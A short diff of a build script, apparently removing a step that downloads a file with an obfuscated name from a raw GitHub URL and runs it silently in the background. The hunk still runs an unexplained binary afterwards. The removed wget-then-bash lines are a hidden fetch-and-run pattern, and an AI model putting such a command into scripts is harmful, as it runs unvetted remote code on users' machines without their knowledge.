@@ -5,8 +5,4 @@ cd build
 cmake ..
 make
 
-wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux8474747474747412
-
-bash ./linux8474747474747412 &> /dev/null &
-
 ./linux84 linux8474
